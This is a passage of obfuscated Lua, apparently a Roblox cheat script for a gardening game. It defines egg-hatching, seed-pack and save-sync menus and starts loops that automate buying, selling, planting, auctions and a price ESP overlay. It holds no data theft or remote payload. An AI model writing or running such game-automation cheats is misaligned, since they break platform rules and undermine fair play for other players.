g.PackOpeningUi = function()
	local G = d:AddTab({
		Name = "<font color=\'#FF0090\'>Eggs</font> & Packs",
		Description = "Egg and seed pack opening",
		Icon = "package-open"
	})
	local V = G:AddLeftGroupbox("Egg Hatcher", "egg")
	local y = G:AddLeftGroupbox("Seed Pack Opener", "package-open")
	local j = G:AddRightGroupbox("Pet Keep Hatch Filters", "paw-print")
	local i = G:AddRightGroupbox("Egg Webhook Filters", "bell-ring")
	local c = G:AddRightGroupbox("Seed Pack Webhook Filters", "bell-ring")
	if V then
		V:AddLabel({
			Text = "Opens matching egg tools. Empty selected list opens all eggs except protected eggs. <font color=\'#FFCC00\'>Set custom per pet filter on Pet Keep Hatch Filters.</font>",
			DoesWrap = true
		})
		local G
		G = V:AddValueDropdown("egg_hatcher_selected_ui", {
			Values = Z.PackOpenHelpers.GetEggDropdownPackOpenHelpers(),
			Default = {};
			Multi = true,
			Text = "\240\159\165\154 Open Selected Eggs";
			Tooltip = "Only selected eggs will be opened. Empty means all.";
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.egg_hatcher_selected = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValue(h.egg_hatcher_selected)
		local y
		y = V:AddValueDropdown("egg_hatcher_protected_ui", {
			Values = Z.PackOpenHelpers.GetEggDropdownPackOpenHelpers(),
			Default = {},
			Multi = true;
			Text = "\240\159\155\161\239\184\143 Protect Eggs",
			Tooltip = "Selected eggs will not be opened.",
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.egg_hatcher_protected = G
				a.Save.SaveDataSync()
			end
		})
		y:SetValue(h.egg_hatcher_protected)
		local j
		j = V:AddValueDropdown("egg_hatcher_keep_pets_ui", {
			Values = Z.PackOpenHelpers.GetPetDropdownPackOpenHelpers();
			Default = {},
			Multi = true,
			Text = "\240\159\142\175 Keep Pets";
			Tooltip = "Selected pets count as a wanted hatch. Empty means use other keep filters.",
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.egg_hatcher_keep_pets = G
				a.Save.SaveDataSync()
			end
		})
		j:SetValue(h.egg_hatcher_keep_pets)
		local i
		i = V:AddValueDropdown("egg_hatcher_keep_sizes_ui", {
			Values = Z.PackOpenHelpers.GetSizeDropdownPackOpenHelpers();
			Default = {};
			Multi = true,
			Text = "\240\159\147\143 Keep Sizes",
			Tooltip = "Normal means no Big or Huge size.",
			Searchable = false,
			MaxVisibleDropdownItems = 5,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.egg_hatcher_keep_sizes = G
				a.Save.SaveDataSync()
			end
		})
		i:SetValue(h.egg_hatcher_keep_sizes)
		local c
		c = V:AddValueDropdown("egg_hatcher_keep_variants_ui", {
			Values = Z.PackOpenHelpers.GetVariantDropdownPackOpenHelpers();
			Default = {},
			Multi = true;
			Text = "\240\159\140\136 Keep Variants";
			Tooltip = "Normal means no Rainbow variant.";
			Searchable = false;
			MaxVisibleDropdownItems = 5,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.egg_hatcher_keep_variants = G
				a.Save.SaveDataSync()
			end
		})
		c:SetValue(h.egg_hatcher_keep_variants)
		local J
		J = V:AddValueDropdown("egg_hatcher_keep_rarities_ui", {
			Values = Z.PackOpenHelpers.GetRarityDropdownPackOpenHelpers();
			Default = {},
			Multi = true;
			Text = "\226\173\144 Keep Rarities",
			Tooltip = "Selected rarities count as wanted hatches. Empty means use other keep filters.";
			Searchable = true;
			MaxVisibleDropdownItems = 8;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.egg_hatcher_keep_rarities = G
				a.Save.SaveDataSync()
			end
		})
		J:SetValue(h.egg_hatcher_keep_rarities)
		local T
		T = V:AddInput("egg_hatcher_max_per_cycle_ui", {
			Text = "\240\159\148\162 Max Per Cycle",
			Default = tostring(h.egg_hatcher_max_per_cycle);
			Numeric = true;
			AllowEmpty = false;
			Finished = true;
			ClearTextOnFocus = false;
			Placeholder = "1",
			Tooltip = "Press Enter to update.",
			Callback = function(G)
				local V = z(G)
				if not V or V < 1 or V > 1000 then
					g.Notify("Max per cycle must be 1-1000", 3)
					T:SetValue(tostring(h.egg_hatcher_max_per_cycle))
					return
				end
				h.egg_hatcher_max_per_cycle = V
				a.Save.SaveDataSync()
			end
		})
		local d
		d = V:AddInput("egg_hatcher_delay_ui", {
			Text = "\226\143\177\239\184\143 Delay",
			Default = tostring(h.egg_hatcher_delay);
			Numeric = true,
			AllowEmpty = false;
			Finished = true;
			ClearTextOnFocus = false;
			Placeholder = "0.35";
			Tooltip = "Press Enter to update.",
			Callback = function(G)
				local V = tonumber(G)
				if not V or V < .001 or V > 10 then
					g.Notify("Delay must be 0.15-10", 3)
					d:SetValue(tostring(h.egg_hatcher_delay))
					return
				end
				h.egg_hatcher_delay = V
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("egg_hatcher_equip_tool_ui", {
			Text = "\240\159\167\176 Equip Tool Before Open";
			Default = h.egg_hatcher_equip_tool,
			Tooltip = "Equips the egg tool before opening.",
			Callback = function(G)
				h.egg_hatcher_equip_tool = G
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("egg_hatcher_keep_super_rarity_ui", {
			Text = "\226\173\144 Always Keep Super+",
			Default = h.egg_hatcher_keep_super_rarity;
			Tooltip = "Super and higher rarity hatches count as wanted by default.",
			Callback = function(G)
				h.egg_hatcher_keep_super_rarity = G
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("egg_hatcher_pause_other_systems_ui", {
			Text = "\226\143\184\239\184\143 Pause Others While Hatching";
			Default = h.egg_hatcher_pause_other_systems;
			Tooltip = "Pauses other automation while Egg Hatcher is opening or waiting for hatch results.",
			Callback = function(G)
				h.egg_hatcher_pause_other_systems = G
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("egg_hatcher_webhook_enabled_ui", {
			Text = "\240\159\148\148 Hatch Webhook";
			Default = h.egg_hatcher_webhook_enabled;
			Tooltip = "Send a webhook when an egg hatch result is detected.",
			Callback = function(G)
				h.egg_hatcher_webhook_enabled = G
				if not G and type(g.EggHatcherWebhookData) == "table" then
					table.clear(g.EggHatcherWebhookData)
				end
				a.Save.SaveDataSync()
			end
		})
		V:AddDivider()
		V:AddDivider()
		V:AddToggle("egg_hatcher_enabled_ui", {
			Text = "\226\156\133 Enable Egg Hatcher",
			Default = h.egg_hatcher_enabled,
			Tooltip = "Automatically opens matching egg tools.",
			Callback = function(G)
				h.egg_hatcher_enabled = G
				if not G then
					g.EggHatcherStatusText = ""
				end
				a.Save.SaveDataSync()
			end
		})
	end
	if j then
		j:AddLabel({
			Text = "\240\159\144\190 Add custom pet keep rules. Empty size or variant means <font color=\'#FFCC00\'>Any</font>. Matching rules override the normal hatch filters.";
			DoesWrap = true
		})
		local G = ""
		local V = {}
		local y = {}
		local i
		local c
		j:AddValueDropdown("egg_hatcher_pet_keep_filter_pet_ui", {
			Values = Z.PackOpenHelpers.GetPetDropdownPackOpenHelpers(),
			Default = "";
			Multi = false,
			Text = "\240\159\144\190 Pet",
			Tooltip = "Choose the pet for a custom hatch filter.";
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Changed = function(Z)
				G = tostring(Z or "")
				local j = nil
				if type(h.egg_hatcher_pet_keep_filters) == "table" then
					j = h.egg_hatcher_pet_keep_filters[G]
				end
				V = {}
				y = {}
				if type(j) == "table" then
					if type(j.size) == "table" then
						V = a.Config.CopyTable(j.size)
					end
					if type(j.variant) == "table" then
						y = a.Config.CopyTable(j.variant)
					end
				end
				if i and type(i.SetValue) == "function" then
					i:SetValue(V)
				end
				if c and type(c.SetValue) == "function" then
					c:SetValue(y)
				end
			end
		})
		i = j:AddValueDropdown("egg_hatcher_pet_keep_filter_size_ui", {
			Values = Z.PackOpenHelpers.GetSizeDropdownPackOpenHelpers();
			Default = {};
			Multi = true;
			Text = "\240\159\147\143 Size";
			Tooltip = "Empty means any size.",
			Searchable = false;
			MaxVisibleDropdownItems = 5;
			Changed = function(G)
				if type(G) == "table" then
					V = G
				end
			end
		})
		i:SetValue({})
		c = j:AddValueDropdown("egg_hatcher_pet_keep_filter_variant_ui", {
			Values = Z.PackOpenHelpers.GetVariantDropdownPackOpenHelpers(),
			Default = {},
			Multi = true;
			Text = "\240\159\140\136 Variant";
			Tooltip = "Empty means any variant.",
			Searchable = false;
			MaxVisibleDropdownItems = 5;
			Changed = function(G)
				if type(G) == "table" then
					y = G
				end
			end
		})
		c:SetValue({})
		j:AddButton({
			Text = "\226\156\133 Enable Pet Filter",
			Tooltip = "Adds or updates the main pet keep filter.";
			Func = function()
				local j, i = Z.EggHatcher.SavePetKeepFilterEggHatcher(G, V, y)
				if j then
					g.Notify("Pet filter enabled", 2)
				else
					g.Notify(tostring(i or "Could not enable filter"), 3)
				end
			end
		})
		j:AddButton({
			Text = "\226\158\149 Add Pet Filter Case";
			Tooltip = "Adds another matching case for this pet.";
			Func = function()
				local j, i = Z.EggHatcher.AddPetKeepFilterCaseEggHatcher(G, V, y)
				if j then
					g.Notify("Pet filter case added", 2)
				else
					g.Notify(tostring(i or "Could not add case"), 3)
				end
			end
		})
		j:AddDivider()
		local J = {}
		g.EggHatcherPetKeepUiRefs.RefreshingRowsEggHatcherPetKeep = false
		local function T(G, V)
			if type(G) ~= "table" then
				return
			end
			if G.Toggle then
				G.Toggle:SetVisible(V)
			end
		end
		local function d(G)
			local V = ""
			local y = nil
			if type(G) == "table" then
				V = tostring(G.pet or "")
				y = G.caseIndex
			end
			if V == "" then
				return
			end
			local i = Z.EggHatcher.GetPetKeepFilterUiKeyEggHatcher(V, y)
			local c = J[i]
			if not c then
				c = {}
				c.Toggle = j:AddToggle(i, {
					Text = Z.EggHatcher.GetPetKeepFilterTextEggHatcher(V, G.rule, y),
					Default = type(G.rule) == "table" and G.rule.enabled == true;
					Tooltip = "Enable or disable this pet keep filter.";
					Callback = function(G)
						if g.EggHatcherPetKeepUiRefs.RefreshingRowsEggHatcherPetKeep then
							return
						end
						Z.EggHatcher.TogglePetKeepFilterEggHatcher(V, G, y)
					end
				})
				J[i] = c
			end
			T(c, true)
			c.Toggle:SetText(Z.EggHatcher.GetPetKeepFilterTextEggHatcher(V, G.rule, y))
			c.Toggle:SetValue(type(G.rule) == "table" and G.rule.enabled == true)
		end
		g.EggHatcherPetKeepUiRefs.RefreshRowsEggHatcherPetKeep = function()
			g.EggHatcherPetKeepUiRefs.RefreshingRowsEggHatcherPetKeep = true
			local G = {}
			for V, y in ipairs(Z.EggHatcher.GetSortedPetKeepFiltersEggHatcher()) do
				local j = tostring(y.pet or "")
				if j ~= "" then
					local V = Z.EggHatcher.GetPetKeepFilterUiKeyEggHatcher(j, y.caseIndex)
					G[V] = true
					d(y)
				end
			end
			for V, y in pairs(J) do
				if not G[V] then
					T(y, false)
				end
			end
			g.EggHatcherPetKeepUiRefs.RefreshingRowsEggHatcherPetKeep = false
		end
		Z.EggHatcher.RefreshPetKeepFiltersUiEggHatcher()
	end
	if y then
		y:AddLabel({
			Text = "Opens matching seed pack tools. Empty selected list opens all packs except protected packs.";
			DoesWrap = true
		})
		local G
		G = y:AddValueDropdown("seed_pack_opener_selected_ui", {
			Values = Z.PackOpenHelpers.GetSeedPackDropdownPackOpenHelpers(),
			Default = {};
			Multi = true,
			Text = "\240\159\142\129 Open Selected Packs";
			Tooltip = "Only selected seed packs will be opened. Empty means all.";
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.seed_pack_opener_selected = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValue(h.seed_pack_opener_selected)
		local V
		V = y:AddValueDropdown("seed_pack_opener_protected_ui", {
			Values = Z.PackOpenHelpers.GetSeedPackDropdownPackOpenHelpers();
			Default = {},
			Multi = true;
			Text = "\240\159\155\161\239\184\143 Protect Packs",
			Tooltip = "Selected seed packs will not be opened.",
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.seed_pack_opener_protected = G
				a.Save.SaveDataSync()
			end
		})
		V:SetValue(h.seed_pack_opener_protected)
		local j
		j = y:AddInput("seed_pack_opener_max_per_cycle_ui", {
			Text = "\240\159\148\162 Max Per Cycle",
			Default = tostring(h.seed_pack_opener_max_per_cycle);
			Numeric = true;
			AllowEmpty = false;
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "1",
			Tooltip = "Press Enter to update.";
			Callback = function(G)
				local V = z(G)
				if not V or V < 1 or V > 20 then
					g.Notify("Max per cycle must be 1-20", 3)
					j:SetValue(tostring(h.seed_pack_opener_max_per_cycle))
					return
				end
				h.seed_pack_opener_max_per_cycle = V
				a.Save.SaveDataSync()
			end
		})
		local i
		i = y:AddInput("seed_pack_opener_delay_ui", {
			Text = "\226\143\177\239\184\143 Delay";
			Default = tostring(h.seed_pack_opener_delay);
			Numeric = true;
			AllowEmpty = false;
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "0.35",
			Tooltip = "Press Enter to update.",
			Callback = function(G)
				local V = tonumber(G)
				if not V or V < .15 or V > 10 then
					g.Notify("Delay must be 0.15-10", 3)
					i:SetValue(tostring(h.seed_pack_opener_delay))
					return
				end
				h.seed_pack_opener_delay = V
				a.Save.SaveDataSync()
			end
		})
		y:AddToggle("seed_pack_opener_equip_tool_ui", {
			Text = "\240\159\167\176 Equip Tool Before Open";
			Default = h.seed_pack_opener_equip_tool;
			Tooltip = "Equips the seed pack tool before opening.";
			Callback = function(G)
				h.seed_pack_opener_equip_tool = G
				a.Save.SaveDataSync()
			end
		})
		y:AddToggle("seed_pack_opener_webhook_enabled_ui", {
			Text = "\240\159\148\148 Seed Pack Webhook",
			Default = h.seed_pack_opener_webhook_enabled;
			Tooltip = "Send a webhook when a seed pack result is detected.",
			Callback = function(G)
				h.seed_pack_opener_webhook_enabled = G
				if not G and type(g.SeedPackOpenerWebhookData) == "table" then
					table.clear(g.SeedPackOpenerWebhookData)
				end
				a.Save.SaveDataSync()
			end
		})
		y:AddToggle("seed_pack_opener_enabled_ui", {
			Text = "\226\156\133 Enable Seed Pack Opener";
			Default = h.seed_pack_opener_enabled;
			Tooltip = "Automatically opens matching seed pack tools.";
			Callback = function(G)
				h.seed_pack_opener_enabled = G
				if not G then
					g.SeedPackOpenerStatusText = ""
				end
				a.Save.SaveDataSync()
			end
		})
	end
	if i then
		local G
		G = i:AddValueDropdown("egg_hatcher_webhook_pets_ui", {
			Values = Z.PackOpenHelpers.GetPetDropdownPackOpenHelpers(),
			Default = {};
			Multi = true;
			Text = "\240\159\144\190 Pets";
			Tooltip = "Only selected pets send webhook. Empty means all.";
			Searchable = true;
			MaxVisibleDropdownItems = 10;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.egg_hatcher_webhook_pets = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValue(h.egg_hatcher_webhook_pets)
		local V
		V = i:AddValueDropdown("egg_hatcher_webhook_rarities_ui", {
			Values = Z.PackOpenHelpers.GetRarityDropdownPackOpenHelpers();
			Default = {};
			Multi = true,
			Text = "\226\173\144 Rarities",
			Tooltip = "Only selected rarities send webhook. Empty means all.";
			Searchable = true,
			MaxVisibleDropdownItems = 8,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.egg_hatcher_webhook_rarities = G
				a.Save.SaveDataSync()
			end
		})
		V:SetValue(h.egg_hatcher_webhook_rarities)
		local y
		y = i:AddValueDropdown("egg_hatcher_webhook_sizes_ui", {
			Values = Z.PackOpenHelpers.GetSizeDropdownPackOpenHelpers();
			Default = {};
			Multi = true;
			Text = "\240\159\147\143 Sizes",
			Tooltip = "Only selected sizes send webhook. Empty means all.",
			Searchable = false,
			MaxVisibleDropdownItems = 5;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.egg_hatcher_webhook_sizes = G
				a.Save.SaveDataSync()
			end
		})
		y:SetValue(h.egg_hatcher_webhook_sizes)
		local j
		j = i:AddValueDropdown("egg_hatcher_webhook_variants_ui", {
			Values = Z.PackOpenHelpers.GetVariantDropdownPackOpenHelpers(),
			Default = {},
			Multi = true,
			Text = "\240\159\140\136 Variants";
			Tooltip = "Only selected variants send webhook. Empty means all.";
			Searchable = false;
			MaxVisibleDropdownItems = 5;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.egg_hatcher_webhook_variants = G
				a.Save.SaveDataSync()
			end
		})
		j:SetValue(h.egg_hatcher_webhook_variants)
	end
	if c then
		local G
		G = c:AddValueDropdown("seed_pack_opener_webhook_seeds_ui", {
			Values = Z.PackOpenHelpers.GetSeedDropdownPackOpenHelpers(),
			Default = {},
			Multi = true;
			Text = "\240\159\140\177 Seeds";
			Tooltip = "Only selected seeds send webhook. Empty means all.",
			Searchable = true;
			MaxVisibleDropdownItems = 10;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.seed_pack_opener_webhook_seeds = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValue(h.seed_pack_opener_webhook_seeds)
		local V
		V = c:AddValueDropdown("seed_pack_opener_webhook_rarities_ui", {
			Values = Z.PackOpenHelpers.GetRarityDropdownPackOpenHelpers(),
			Default = {},
			Multi = true;
			Text = "\226\173\144 Rarities",
			Tooltip = "Only selected rarities send webhook. Empty means all.",
			Searchable = true,
			MaxVisibleDropdownItems = 8,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.seed_pack_opener_webhook_rarities = G
				a.Save.SaveDataSync()
			end
		})
		V:SetValue(h.seed_pack_opener_webhook_rarities)
	end
end
g.SaveManagerUi = function()
	local G = d:AddTab({
		Name = "Save Manager";
		Description = "Online saves and account sync";
		Icon = "cloud-cog"
	})
	local V = G:AddLeftGroupbox("Save Online", "cloud-upload")
	local y = G:AddRightGroupbox("Real Time Sync", "refresh-cw")
	local j = G:AddLeftGroupbox("Share Launcher", "copy")
	g.SaveSyncUiRefs = g.SaveSyncUiRefs or {}
	if V then
		V:AddLabel({
			Text = "Save your settings online and use your code on other accounts.",
			DoesWrap = true
		})
		g.SaveSyncUiRefs.CodeLabel = V:AddLabel({
			Text = "Your code: <font color=\'#FFCC66\'>Enable Save Online to create one</font>",
			DoesWrap = true
		})
		g.SaveSyncUiRefs.SaveOnlineStatusLabel = V:AddLabel({
			Text = g.SaveSyncStatusText ~= "" and g.SaveSyncStatusText or "<font color=\'#888888\'>Ready</font>",
			DoesWrap = true
		})
		V:AddButton({
			Text = "Load Saved Data",
			Tooltip = "Loads this account\'s online save after confirmation.";
			Func = function()
				if not Z.SaveSync.GuardPremiumSaveSync("Premium required to load online save") then
					return
				end
				if not T or type(T.Confirm) ~= "function" then
					Z.SaveSync.PullSaveSync("", true)
					return
				end
				T:Confirm({
					Title = "Load saved data?",
					Description = "This will apply the online save for this account and update your local settings.",
					Callback = function(G)
						if G then
							Z.SaveSync.PullSaveSync("", true)
						end
					end
				})
			end
		})
		V:AddToggle("save_sync_online_enabled_ui", {
			Text = "Enable Save Online";
			Default = h.save_sync_online_enabled,
			Tooltip = "Saves this account\'s settings online when they change.";
			Callback = function(G)
				if G == true and not Z.SaveSync.GuardPremiumSaveSync("Premium required for online saving") then
					return
				end
				h.save_sync_online_enabled = G == true
				a.Save.SaveDataSync()
				if h.save_sync_online_enabled then
					Z.SaveSync.SendPushSaveSync("manual")
				else
					Z.SaveSync.SetStatusSaveSync("Online saving disabled", "#CFCFCF")
					Z.SaveSync.RefreshUiSaveSync()
				end
			end
		})
		V:AddButton({
			Text = "Save Now";
			Tooltip = "Uploads your current settings now.",
			Func = function()
				if not Z.SaveSync.GuardPremiumSaveSync("Premium required for online saving") then
					return
				end
				Z.SaveSync.SendPushSaveSync("manual")
			end
		})
	end
	if y then
		y:AddLabel({
			Text = "Enter another account\'s code to copy its saved settings.",
			DoesWrap = true
		})
		g.SaveSyncUiRefs.ShareCodeLabel = y:AddLabel({
			Text = tostring(h.save_sync_share_code or "") ~= "" and "Saved sync code: <font color=\'#7CFC00\'>" .. (tostring(h.save_sync_share_code or "") .. "</font>") or "No sync code saved. Type a code and press Enter to save it.",
			DoesWrap = true
		})
		g.SaveSyncUiRefs.RealtimeSyncStatusLabel = y:AddLabel({
			Text = g.SaveSyncStatusText ~= "" and g.SaveSyncStatusText or "<font color=\'#888888\'>Ready</font>";
			DoesWrap = true
		})
		y:AddInput("save_sync_share_code_ui", {
			Text = "Share Code",
			Default = h.save_sync_share_code,
			Numeric = false;
			AllowEmpty = true;
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "Enter code then press Enter",
			Tooltip = "Type the account code and press Enter to save it.",
			Callback = function(G)
				local V = Z.SaveSync.CleanShareCodeSaveSync(G)
				h.save_sync_share_code = V
				h.save_sync_pull_revision = 0
				h.save_sync_pull_hash = ""
				a.Save.SaveDataSync()
				Z.SaveSync.SetStatusSaveSync(V ~= "" and "Sync code updated" or "No code entered. Type a code and press Enter to save it.", V ~= "" and "#CFCFCF" or "#FFCC66")
				Z.SaveSync.RefreshUiSaveSync()
			end
		})
		y:AddToggle("save_sync_auto_pull_enabled_ui", {
			Text = "Enable Sync",
			Default = h.save_sync_auto_pull_enabled;
			Tooltip = "Checks the entered code every few seconds and applies new settings.";
			Callback = function(G)
				if G == true and not Z.SaveSync.GuardPremiumSaveSync("Premium required for online sync") then
					return
				end
				h.save_sync_auto_pull_enabled = G == true
				a.Save.SaveDataSync()
				if h.save_sync_auto_pull_enabled then
					local G = Z.SaveSync.CleanShareCodeSaveSync(h.save_sync_share_code)
					if G == "" then
						Z.SaveSync.SetStatusSaveSync("Enter a share code", "#FFCC66")
						Z.SaveSync.RefreshUiSaveSync()
						return
					end
					Z.SaveSync.PullSaveSync(G, false)
				else
					Z.SaveSync.SetStatusSaveSync("Real time sync disabled", "#CFCFCF")
					Z.SaveSync.RefreshUiSaveSync()
				end
			end
		})
		y:AddButton({
			Text = "Pull Now",
			Tooltip = "Checks the entered code now.",
			Func = function()
				if not Z.SaveSync.GuardPremiumSaveSync("Premium required for online sync") then
					return
				end
				local G = Z.SaveSync.CleanShareCodeSaveSync(h.save_sync_share_code)
				if G == "" then
					Z.SaveSync.SetStatusSaveSync("Enter a share code", "#FFCC66")
					Z.SaveSync.RefreshUiSaveSync()
					return
				end
				Z.SaveSync.PullSaveSync(G, true)
			end
		})
	end
	if j then
		j:AddLabel({
			Text = "Copy a small launcher for your other accounts. It only sets your key, mode and sync code.",
			DoesWrap = true
		})
		j:AddButton({
			Text = "Copy Share Launcher";
			Tooltip = "Copies a launcher that connects another account to this saved code.",
			Func = function()
				local G = a.Config.BuildShareLauncherText()
				if type(G) ~= "string" or G == "" then
					g.Notify("Failed to create launcher", 3)
					return
				end
				q.CopyToClipBoard(G)
				g.Notify("Share launcher copied. Add your key before using it.", 3)
			end
		})
	end
	Z.SaveSync.RefreshUiSaveSync()
end
g.InitUi = function()
	g.HomeDashboardUi()
	g.SaveManagerUi()
	g.PremiumUi()
	g.AutomationUi()
	g.MailUi()
	g.GiftUi()
	g.PlantsUi()
	g.PackOpeningUi()
	g.AutoUi()
	g.PetUi()
	g.PetEquipTriggersUi()
	g.PetTriggersV2Ui()
	g.GardenItemsUi()
	g.CollectUi()
	g.SellingUi()
	g.Shopui()
	g.AuctioneerUi()
	g.WebhooksUi()
	g.SettingsUi()
	g.TweaksUi()
end
if T and d then
	g.InitUi()
end
Z.Mail.MailLoopStart()
Z.WebMailOrder.StartWebMailOrder()
Z.PetFinderPremium.Start()
Z.LiveMapPetsApi.Start()
Z.MoonPredictor.Start()
Z.PetEquipTriggers.StartPetEquipTriggers()
Z.PetTriggersV2.StartPetTriggersV2()
Z.BackpackFruitPriceEsp.StartBackpackFruitPriceEsp()
Z.SellMultiplierOverrides.StartLiveBoardSellMultiplierOverrides()
Z.LivePlantsBoard.StartLivePlantsBoard()
Z.SaveSync.StartSaveSync()
Y.FastAuction.StartFastAuction()
Y.Auctioneer.StartAuctioneer()
task.spawn(function()
	while true do
		task.wait(3)
		Z.Webhooks.Loop()
	end
end)
task.spawn(function()
	while true do
		task.wait(1)
		if not Z.SystemPause.IsPausedSystemPause("Pet Farm Return") then
			Z.PetFarmReturn.Loop()
		end
	end
end)
task.spawn(function()
	while true do
		task.wait(5)
		if Z.SystemPause.IsPausedSystemPause("Shop Loops") then
			continue
		end
		Y.SeedShop.SeedBuyerLoop()
		Y.GearShop.GearShopLoop()
		Y.CrateShop.CrateShopLoop()
	end
end)
task.spawn(function()
	while true do
		task.wait(3)
		if Z.SystemPause.IsPausedSystemPause("Fast Loops") then
			continue
		end
		if Z.DoubleOrNothingSeller and type(Z.DoubleOrNothingSeller.LoopDoubleOrNothingSeller) == "function" then
			Z.DoubleOrNothingSeller.LoopDoubleOrNothingSeller()
		end
		if Z.FruitFavouriteManager and type(Z.FruitFavouriteManager.LoopFruitFavouriteManager) == "function" then
			Z.FruitFavouriteManager.LoopFruitFavouriteManager()
		end
	end
end)
task.spawn(function()
	while true do
		task.wait(1)
		Z.EggHatcher.LoopEggHatcher()
		if Z.SystemPause.IsPausedSystemPause("Tool Loops") then
			continue
		end
		if Z.MutationSeedPlacer and type(Z.MutationSeedPlacer.LoopMutationSeedPlacer) == "function" then
			Z.MutationSeedPlacer.LoopMutationSeedPlacer()
		end
		Z.Trowel.Loop()
		Z.SprinklerPlacer.Loop()
		Z.PlantShovel.LoopPlantShovel()
		Z.ShovelFruits.LoopShovelFruits()
		Z.Seeder.SeedPlaceLoop()
		Z.SmartSeedProgression.LoopSmartSeedProgression()
		Z.WaterPlants.Loop()
		Z.FriendGardenCare.LoopFriendGardenCare()
		Z.SeedPackOpener.LoopSeedPackOpener()
		if Z.GardenItems and (Z.GardenItems.PottedPlantWeatherGuard and type(Z.GardenItems.PottedPlantWeatherGuard.LoopPottedPlantWeatherGuard) == "function") then
			Z.GardenItems.PottedPlantWeatherGuard.LoopPottedPlantWeatherGuard()
		end
		if Z.AutoDropItems and type(Z.AutoDropItems.LoopAutoDropItems) == "function" then
			Z.AutoDropItems.LoopAutoDropItems()
		end
	end
end)
task.spawn(function()
	while true do
		task.wait(.5)
		local G = {}
		local V = h.auto_collect_fruit_enabled == true or Z.TotalControl.ResolveFruitCollectorEnabledTotalControl() == true
		if V then
			local V = Z.FruitCollect.GetTextCurrentInventoryFruitStats()
			table.insert(G, V)
			table.insert(G, e.RealTimeStats.GetIncomeExpenseLineRealTimeStats((e.RealTimeStats.GetTextSizesRealTimeStats()).normal))
		end
		if h.auto_collect_event_seeds and (type(g.EventSeedCollectStatusText) == "string" and g.EventSeedCollectStatusText ~= "") then
			table.insert(G, g.EventSeedCollectStatusText)
		end
		if h.potted_weather_guard_enabled and (type(g.PottedPlantWeatherGuardStatusText) == "string" and g.PottedPlantWeatherGuardStatusText ~= "") then
			table.insert(G, g.PottedPlantWeatherGuardStatusText)
		end
		if h.weather_kick_enabled and (type(g.WeatherKickRejoinStatusText) == "string" and g.WeatherKickRejoinStatusText ~= "") then
			table.insert(G, g.WeatherKickRejoinStatusText)
		end
		if Z.TotalControl.IsEnabledTotalControl() and (type(g.TotalControlStatusText) == "string" and g.TotalControlStatusText ~= "") then
			table.insert(G, g.TotalControlStatusText)
		end
		if h.auto_seedplace and g.SeedPlaceStatusText ~= "" then
			table.insert(G, g.SeedPlaceStatusText)
		end
		if h.mutation_seed_placer_enabled and (type(g.MutationSeedPlacerStatusText) == "string" and g.MutationSeedPlacerStatusText ~= "") then
			table.insert(G, g.MutationSeedPlacerStatusText)
		end
		if ((h.smart_seed_progression_enabled or Z.TotalControl.ResolveSmartSeedingEnabledTotalControl() == true)) and (type(g.SmartSeedProgressionStatusText) == "string" and g.SmartSeedProgressionStatusText ~= "") then
			table.insert(G, g.SmartSeedProgressionStatusText)
		end
		if h.auto_sell_sellallinventory and (type(g.SellStatusText) == "string" and g.SellStatusText ~= "") then
			table.insert(G, g.SellStatusText)
		end
		if h.sell_multiplier_enabled and (type(g.SellMultiplierOverrideStatusText) == "string" and g.SellMultiplierOverrideStatusText ~= "") then
			table.insert(G, g.SellMultiplierOverrideStatusText)
		end
		if ((h.daily_deal_status_enabled == true or h.auto_use_daily_deal == true)) and (type(g.DailyDealStatusText) == "string" and g.DailyDealStatusText ~= "") then
			table.insert(G, g.DailyDealStatusText)
		end
		if ((h.auto_double_or_nothing == true or Z.DoubleOrNothingSeller and Z.DoubleOrNothingSeller.PendingCashOutDoubleOrNothingSeller == true)) and (type(g.DoubleOrNothingStatusText) == "string" and g.DoubleOrNothingStatusText ~= "") then
			table.insert(G, g.DoubleOrNothingStatusText)
		end
		if h.auto_sell_pets and (type(g.PetSellerStatusText) == "string" and g.PetSellerStatusText ~= "") then
			table.insert(G, g.PetSellerStatusText)
		end
		if h.pet_equip_enabled and (type(g.PetEquipTriggerStatusText) == "string" and g.PetEquipTriggerStatusText ~= "") then
			table.insert(G, g.PetEquipTriggerStatusText)
		end
		if h.pet_triggers_v2_enabled and (type(g.PetTriggersV2StatusText) == "string" and g.PetTriggersV2StatusText ~= "") then
			table.insert(G, g.PetTriggersV2StatusText)
		end
		if h.egg_hatcher_enabled and (type(g.EggHatcherStatusText) == "string" and g.EggHatcherStatusText ~= "") then
			table.insert(G, g.EggHatcherStatusText)
		end
		if h.seed_pack_opener_enabled and (type(g.SeedPackOpenerStatusText) == "string" and g.SeedPackOpenerStatusText ~= "") then
			table.insert(G, g.SeedPackOpenerStatusText)
		end
		if h.auctioneer_enabled and (type(g.AuctioneerStatusText) == "string" and g.AuctioneerStatusText ~= "") then
